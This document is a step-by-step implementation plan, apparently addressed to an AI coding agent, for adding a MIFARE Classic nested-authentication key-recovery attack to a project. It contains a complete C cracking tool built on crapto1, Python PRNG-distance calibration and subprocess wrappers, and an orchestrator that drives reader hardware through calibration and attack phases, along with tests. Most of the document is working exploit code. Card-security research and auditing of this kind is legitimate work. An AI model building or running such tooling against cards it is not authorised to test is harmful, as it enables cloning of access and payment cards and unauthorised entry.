# Nested Attack Key Recovery Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Recover unknown MIFARE Classic sector keys using nested authentication attack with known key from sectors 0-4.

**Architecture:** A C CLI tool (`nested.exe`) uses crapto1's `lfsr_recovery32` to recover keys from encrypted nonce pairs. Python calibrates the PRNG distance using known sectors, then calls the C tool via subprocess. The attack orchestrator manages a two-phase flow: calibrate between known sectors first, then attack the target sector.

**Tech Stack:** C (crapto1 library), Python 3.11, subprocess, pytest

---

### Task 1: Write nested.c

**Files:**
- Create: `gui/crapto1/nested.c`

**Step 1: Create nested.c**

```c
/*  nested.c
 *
 *  MIFARE Classic key recovery from nested authentication nonce pairs.
 *  Uses lfsr_recovery32 to find candidate LFSR states from predicted
 *  keystream, validates against additional nonce pairs.
 *
 *  Usage: nested <uid> <dist> <ntK0> <ntT0> [<ntK1> <ntT1> ...]
 *  uid: 32-bit card UID (hex)
 *  dist: PRNG distance between known and target nonces (decimal)
 *  ntKN: known-sector nonce (hex)
 *  ntTN: target-sector encrypted nonce (hex)
 *
 *  Outputs: "Found key: <12-hex-chars>" or "No key found"
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include "crapto1.h"

int main(int argc, char *argv[]) {
    if (argc < 5 || (argc - 3) % 2 != 0) {
        fprintf(stderr,
            "Usage: %s <uid> <dist> <ntK0> <ntT0> [<ntK1> <ntT1> ...]\n"
            "  uid:  card UID (hex)\n"
            "  dist: PRNG distance (decimal)\n"
            "  ntKN: known-sector nonce (hex)\n"
            "  ntTN: target-sector encrypted nonce (hex)\n",
            argv[0]);
        return 1;
    }

    uint32_t uid;
    sscanf(argv[1], "%x", &uid);
    int dist = atoi(argv[2]);

    int npairs = (argc - 3) / 2;
    uint32_t *nt_known  = malloc(npairs * sizeof(uint32_t));
    uint32_t *nt_target = malloc(npairs * sizeof(uint32_t));
    if (!nt_known || !nt_target) {
        fprintf(stderr, "Memory allocation failed\n");
        return 2;
    }

    for (int i = 0; i < npairs; i++) {
        sscanf(argv[3 + i * 2], "%x", &nt_known[i]);
        sscanf(argv[4 + i * 2], "%x", &nt_target[i]);
    }

    /* Predict plaintext nonce for first pair */
    uint32_t nt_pred0 = prng_successor(nt_known[0], dist);
    uint32_t ks32 = nt_target[0] ^ nt_pred0;

    /* Recover candidate LFSR states */
    struct Crypto1State *candidates = lfsr_recovery32(ks32, uid ^ nt_pred0);
    if (!candidates) {
        fprintf(stderr, "lfsr_recovery32 allocation failed\n");
        free(nt_known);
        free(nt_target);
        return 2;
    }

    int found = 0;
    for (struct Crypto1State *t = candidates; t->odd | t->even; ++t) {
        /* Roll back uid^nt feed to extract the raw key */
        lfsr_rollback_word(t, uid ^ nt_pred0, 0);
        uint64_t key;
        crypto1_get_lfsr(t, &key);

        /* Validate against all remaining pairs */
        int valid = 1;
        for (int i = 1; i < npairs && valid; i++) {
            uint32_t nt_pred_i = prng_successor(nt_known[i], dist);
            struct Crypto1State *s = crypto1_create(key);
            if (!s) { valid = 0; break; }
            uint32_t ks32_i = crypto1_word(s, uid ^ nt_pred_i, 0);
            if (ks32_i != (nt_target[i] ^ nt_pred_i)) {
                valid = 0;
            }
            crypto1_destroy(s);
        }

        if (valid) {
            printf("Found key: %012" PRIx64 "\n", key);
            found = 1;
            break;
        }
    }

    free(candidates);
    free(nt_known);
    free(nt_target);

    if (!found) {
        printf("No key found\n");
        return 1;
    }

    return 0;
}
```

**Step 2: Commit**

```bash
git add gui/crapto1/nested.c
git commit -m "feat: add nested.c CLI tool for nested key recovery"
```

---

### Task 2: Update Makefile and build

**Files:**
- Modify: `gui/crapto1/Makefile`

**Step 1: Update Makefile to build both tools**

Replace the entire Makefile content with:

```makefile
CC      = gcc
CFLAGS  = -O2 -Wall
LDFLAGS = -lm
COMMON  = crapto1.c crypto1.c

all: mfkey32.exe nested.exe

mfkey32.exe: mfkey32.c $(COMMON) crapto1.h parity.h
	$(CC) $(CFLAGS) -o $@ mfkey32.c $(COMMON) $(LDFLAGS)

nested.exe: nested.c $(COMMON) crapto1.h parity.h
	$(CC) $(CFLAGS) -o $@ nested.c $(COMMON) $(LDFLAGS)

clean:
	rm -f mfkey32.exe nested.exe

.PHONY: all clean
```

**Step 2: Build**

Run: `cd gui/crapto1 && mingw32-make clean && mingw32-make`
Expected: Both `mfkey32.exe` and `nested.exe` compile without errors.

**Step 3: Smoke test nested.exe**

Run: `./gui/crapto1/nested.exe`
Expected: Usage message, exit code 1.

**Step 4: Commit**

```bash
git add gui/crapto1/Makefile
git commit -m "feat: update Makefile to build nested.exe"
```

---

### Task 3: Write test for calibrate_nested_distance

**Files:**
- Test: `gui/tests/test_key_recovery.py`

**Step 1: Write the failing test**

Add to the end of `gui/tests/test_key_recovery.py`:

```python
def test_calibrate_nested_distance():
    """Calibration finds correct PRNG distance using known key."""
    from key_recovery import calibrate_nested_distance

    uid = 0xE413B3DA
    known_key = bytes.fromhex("FFFFFFFFFFFF")
    nt_known = 0x01020304
    dist = 160

    # Generate synthetic encrypted nonce
    nt_target_plain = prng_successor(nt_known, dist)
    c = Crypto1(known_key)
    ks32 = c.crypto1_word(uid ^ nt_target_plain, 0)
    nt_target_enc = nt_target_plain ^ ks32

    result = calibrate_nested_distance(uid, nt_known, nt_target_enc, known_key)
    assert result == dist


def test_calibrate_nested_distance_not_found():
    """Calibration returns None when no valid distance exists."""
    from key_recovery import calibrate_nested_distance

    result = calibrate_nested_distance(0xDEADBEEF, 0x11111111, 0x22222222,
                                       bytes.fromhex("FFFFFFFFFFFF"))
    assert result is None
```

**Step 2: Run test to verify it fails**

Run: `cd gui && python -m pytest tests/test_key_recovery.py::test_calibrate_nested_distance -v`
Expected: FAIL with `ImportError` (function doesn't exist yet)

**Step 3: Commit**

```bash
git add gui/tests/test_key_recovery.py
git commit -m "test: add calibration distance tests"
```

---

### Task 4: Implement calibrate_nested_distance

**Files:**
- Modify: `gui/key_recovery.py`

**Step 1: Add the function**

Add after the `find_prng_distance` function (after line 24):

```python
def calibrate_nested_distance(uid: int, nt_known: int, nt_target_enc: int,
                              known_key: bytes, max_dist: int = 65536) -> int | None:
    """Find PRNG distance by checking which distance produces matching keystream.

    During nested auth, nt_target is encrypted with the key's initial keystream:
      nt_enc = nt_plain XOR crypto1_word(key, uid ^ nt_plain)
    We try each distance until the keystream matches.
    """
    nt_pred = nt_known
    for d in range(max_dist + 1):
        c = Crypto1(known_key)
        ks32 = c.crypto1_word(uid ^ nt_pred, 0)
        if ks32 == (nt_target_enc ^ nt_pred):
            return d
        nt_pred = prng_successor(nt_pred, 1)
    return None
```

**Step 2: Run tests**

Run: `cd gui && python -m pytest tests/test_key_recovery.py::test_calibrate_nested_distance tests/test_key_recovery.py::test_calibrate_nested_distance_not_found -v`
Expected: Both PASS

**Step 3: Commit**

```bash
git add gui/key_recovery.py
git commit -m "feat: add calibrate_nested_distance for PRNG timing"
```

---

### Task 5: Write test for nested_recover with subprocess

**Files:**
- Test: `gui/tests/test_key_recovery.py`

**Step 1: Write the failing test**

Add to the end of `gui/tests/test_key_recovery.py`:

```python
def test_nested_recover_with_exe():
    """Nested recovery via subprocess finds the correct key."""
    from key_recovery import nested_recover, _NESTED_PATH

    if not os.path.isfile(_NESTED_PATH):
        import pytest
        pytest.skip("nested.exe not built")

    uid = 0xE413B3DA
    target_key = bytes.fromhex("A0A1A2A3A4A5")
    dist = 160

    # Generate 5 synthetic nonce pairs
    nonce_pairs = []
    for nt_k in [0x01020304, 0xAABBCCDD, 0x11223344, 0x55667788, 0xDEADBEEF]:
        nt_plain = prng_successor(nt_k, dist)
        c = Crypto1(target_key)
        ks32 = c.crypto1_word(uid ^ nt_plain, 0)
        nt_enc = nt_plain ^ ks32
        nonce_pairs.append((nt_k, nt_enc))

    keys = nested_recover(uid, dist, nonce_pairs)
    assert len(keys) == 1
    assert keys[0] == bytes.fromhex("a0a1a2a3a4a5")
```

**Step 2: Run test to verify it fails**

Run: `cd gui && python -m pytest tests/test_key_recovery.py::test_nested_recover_with_exe -v`
Expected: FAIL with `ImportError` or `TypeError` (function signature changed)

**Step 3: Commit**

```bash
git add gui/tests/test_key_recovery.py
git commit -m "test: add nested_recover subprocess test"
```

---

### Task 6: Implement nested_recover with subprocess

**Files:**
- Modify: `gui/key_recovery.py`

**Step 1: Add _NESTED_PATH constant**

Add after the `_MFKEY32_PATH` line (line 14):

```python
_NESTED_PATH = os.path.join(os.path.dirname(__file__), "crapto1", "nested.exe")
```

**Step 2: Replace the nested_recover function**

Replace the entire `nested_recover` function (lines 52-87) with:

```python
def nested_recover(uid: int, distance: int,
                   nonce_pairs: list[tuple[int, int]]) -> list[bytes]:
    """
    Recover target sector key from nested authentication nonce pairs.

    Uses the nested.exe CLI tool (crapto1 lfsr_recovery32) to find the key
    from encrypted nonce data and a calibrated PRNG distance.

    Args:
        uid: 32-bit card UID
        distance: calibrated PRNG tick distance between nonces
        nonce_pairs: list of (nt_known, nt_target_enc) tuples

    Returns:
        List of candidate keys (6-byte bytes objects)
    """
    if not nonce_pairs or not os.path.isfile(_NESTED_PATH):
        return []

    args = [
        _NESTED_PATH,
        f"{uid:08X}",
        str(distance),
    ]
    for nt_k, nt_t in nonce_pairs:
        args.extend([f"{nt_k:08X}", f"{nt_t:08X}"])

    try:
        result = subprocess.run(
            args, capture_output=True, text=True, timeout=300
        )
        for line in result.stdout.splitlines():
            if line.startswith("Found key:"):
                key_hex = line.split(":")[1].strip()
                return [bytes.fromhex(key_hex)]
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    return []
```

**Step 3: Update the import line**

The existing import line at line 11 already imports everything needed. No change required.

**Step 4: Run tests**

Run: `cd gui && python -m pytest tests/test_key_recovery.py -v`
Expected: All tests PASS (nested_recover test may skip if nested.exe not built)

**Step 5: Commit**

```bash
git add gui/key_recovery.py
git commit -m "feat: implement nested_recover via subprocess"
```

---

### Task 7: Write test for orchestrator two-phase nested attack

**Files:**
- Test: `gui/tests/test_attack.py`

**Step 1: Write the failing test**

Add to the end of `gui/tests/test_attack.py`:

```python
def test_nested_calibration_then_attack():
    """Orchestrator runs calibration phase before attack phase."""
    serial = FakeSerial()
    orch = AttackOrchestrator(serial)

    orch.start_nested_attack(
        known_sector=0,
        target_sector=5,
        known_key=bytes.fromhex("FFFFFFFFFFFF"),
    )

    # Should be in calibration phase
    assert orch.state == "nested_calibrating"
    # Should have sent nested command for calibration (sector 0 -> sector 1)
    assert any("N" in cmd and "04" in cmd for cmd in serial.commands)

    # Simulate calibration DONE
    orch.feed({"type": "NESTED", "subtype": "NT",
               "nt_known": "01020304", "nt_target": "AABBCCDD"})
    orch.feed({"type": "NESTED", "subtype": "DONE"})

    # Should transition to attack phase
    assert orch.state == "nested"
    # Should have sent second nested command for target sector
    assert len(serial.commands) >= 2


def test_nested_attack_stores_distance():
    """Orchestrator stores calibrated distance."""
    serial = FakeSerial()
    orch = AttackOrchestrator(serial)
    orch._uid = 0xE413B3DA

    orch.start_nested_attack(
        known_sector=0,
        target_sector=5,
        known_key=bytes.fromhex("FFFFFFFFFFFF"),
    )

    # Feed synthetic calibration data with known distance
    from crypto1 import Crypto1, prng_successor
    uid = 0xE413B3DA
    known_key = bytes.fromhex("FFFFFFFFFFFF")
    nt_known = 0x01020304
    dist = 160
    nt_pred = prng_successor(nt_known, dist)
    c = Crypto1(known_key)
    ks32 = c.crypto1_word(uid ^ nt_pred, 0)
    nt_enc = nt_pred ^ ks32

    orch.feed({"type": "NESTED", "subtype": "NT",
               "nt_known": f"{nt_known:08X}",
               "nt_target": f"{nt_enc:08X}"})
    orch.feed({"type": "NESTED", "subtype": "DONE"})

    assert orch._calibrated_distance is not None
    assert orch.state == "nested"
```

**Step 2: Run tests to verify they fail**

Run: `cd gui && python -m pytest tests/test_attack.py::test_nested_calibration_then_attack tests/test_attack.py::test_nested_attack_stores_distance -v`
Expected: FAIL with `AttributeError` (method doesn't exist)

**Step 3: Commit**

```bash
git add gui/tests/test_attack.py
git commit -m "test: add orchestrator nested two-phase tests"
```

---

### Task 8: Implement orchestrator two-phase nested attack

**Files:**
- Modify: `gui/attack.py`

**Step 1: Add import**

Update line 11 to:

```python
from key_recovery import darkside_recover, nested_recover, calibrate_nested_distance
```

**Step 2: Update __init__ with new fields**

Add after `self._target_sector = None` (line 24):

```python
        self._calibrated_distance = None
        self._known_key = None
        self._known_sector = None
```

**Step 3: Add start_nested_attack method**

Add after `stop()` method (after line 46):

```python
    def start_nested_attack(self, known_sector: int, target_sector: int,
                            known_key: bytes):
        """Start two-phase nested attack: calibrate then recover."""
        self._known_sector = known_sector
        self._target_sector = target_sector
        self._known_key = known_key
        self._calibrated_distance = None
        self._nested_data = []

        # Phase 1: calibrate by doing nested auth between two known sectors
        # Sector 0 -> Sector 1 (both should have the same known key)
        known_block = known_sector * 4
        calib_block = (known_sector + 1) * 4
        self.state = "nested_calibrating"
        key_hex = known_key.hex().upper()
        self.serial.send_command(f"N{known_block:02X}{calib_block:02X}{key_hex}")
```

**Step 4: Update _handle_nested to support two phases**

Replace the entire `_handle_nested` method (lines 87-110) with:

```python
    def _handle_nested(self, msg: dict):
        if msg.get("type") != "NESTED":
            return

        subtype = msg.get("subtype")
        if subtype == "NT":
            nt_known = int(msg["nt_known"], 16)
            nt_target = int(msg["nt_target"], 16)
            self._nested_data.append((nt_known, nt_target))
            self.result_queue.put({
                "event": "nested_nonce",
                "count": len(self._nested_data),
                "phase": "calibrating" if self.state == "nested_calibrating" else "attacking",
            })
        elif subtype == "FAIL":
            self.result_queue.put({
                "event": "nested_fail",
                "reason": msg.get("reason", "unknown")
            })
        elif subtype == "DONE":
            if self.state == "nested_calibrating":
                self._finish_calibration()
            elif self.state == "nested":
                self._finish_nested_attack()

    def _finish_calibration(self):
        """Process calibration data and start the actual attack."""
        # Try to find distance from each nonce pair
        distances = []
        for nt_k, nt_t in self._nested_data:
            d = calibrate_nested_distance(
                self._uid, nt_k, nt_t, self._known_key, max_dist=65536
            )
            if d is not None:
                distances.append(d)

        if not distances:
            self.result_queue.put({
                "event": "nested_fail",
                "reason": "calibration_failed"
            })
            self.state = "idle"
            return

        # Use most common distance
        self._calibrated_distance = max(set(distances), key=distances.count)
        self.result_queue.put({
            "event": "nested_calibrated",
            "distance": self._calibrated_distance,
            "samples": len(distances),
        })

        # Phase 2: attack target sector
        self._nested_data = []
        self.state = "nested"
        known_block = self._known_sector * 4
        target_block = self._target_sector * 4
        key_hex = self._known_key.hex().upper()
        self.serial.send_command(f"N{known_block:02X}{target_block:02X}{key_hex}")

    def _finish_nested_attack(self):
        """Process attack data and attempt key recovery."""
        self.state = "idle"
        if self._uid and self._nested_data and self._calibrated_distance is not None:
            candidates = nested_recover(
                self._uid, self._calibrated_distance, self._nested_data
            )
            self.result_queue.put({
                "event": "nested_complete",
                "candidates": [c.hex() for c in candidates],
                "nonce_pairs": len(self._nested_data),
                "distance": self._calibrated_distance,
            })
        else:
            self.result_queue.put({
                "event": "nested_complete",
                "candidates": [],
                "nonce_pairs": len(self._nested_data),
            })
```

**Step 5: Run tests**

Run: `cd gui && python -m pytest tests/test_attack.py -v`
Expected: All tests PASS

**Step 6: Run full test suite**

Run: `cd gui && python -m pytest tests/ -v`
Expected: All tests PASS

**Step 7: Commit**

```bash
git add gui/attack.py
git commit -m "feat: two-phase nested attack orchestrator (calibrate + recover)"
```

---

### Task 9: Build nested.exe and run integration test

**Step 1: Build nested.exe**

Run: `cd gui/crapto1 && mingw32-make`
Expected: Both `mfkey32.exe` and `nested.exe` compile cleanly.

**Step 2: Test nested.exe with synthetic data**

Generate test vectors in Python and pass to nested.exe:

```bash
cd gui && python -c "
from crypto1 import Crypto1, prng_successor
uid=0xE413B3DA; key_hex='A0A1A2A3A4A5'; dist=160
key=bytes.fromhex(key_hex)
pairs=[]
for nt_k in [0x01020304, 0xAABBCCDD, 0x11223344, 0x55667788, 0xDEADBEEF]:
    nt_p=prng_successor(nt_k, dist)
    c=Crypto1(key); ks=c.crypto1_word(uid^nt_p,0)
    pairs.append((nt_k, nt_p^ks))
args=' '.join(f'{k:08X} {t:08X}' for k,t in pairs)
print(f'crapto1/nested.exe {uid:08X} {dist} {args}')
"
```

Run the printed command. Expected output: `Found key: a0a1a2a3a4a5`

**Step 3: Run full test suite including subprocess tests**

Run: `cd gui && python -m pytest tests/ -v`
Expected: All tests PASS (including `test_nested_recover_with_exe`)

**Step 4: Commit**

```bash
git commit --allow-empty -m "chore: verify nested.exe integration tests pass"
```

---

### Task 10: Final verification and wrap-up

**Step 1: Run complete test suite**

Run: `cd gui && python -m pytest tests/ -v`
Expected: All tests PASS.

**Step 2: Verify build artifacts are gitignored**

Run: `cd gui/crapto1 && git status`
Expected: `nested.exe` should NOT appear (already covered by `.gitignore` pattern `*.exe`).

**Step 3: Final commit with all changes**

If any unstaged changes remain:

```bash
git add -A
git commit -m "feat: complete nested attack key recovery implementation"
```

**Step 4: Use finishing-a-development-branch skill**

> **REQUIRED SUB-SKILL:** Use superpowers:finishing-a-development-branch to complete this work.
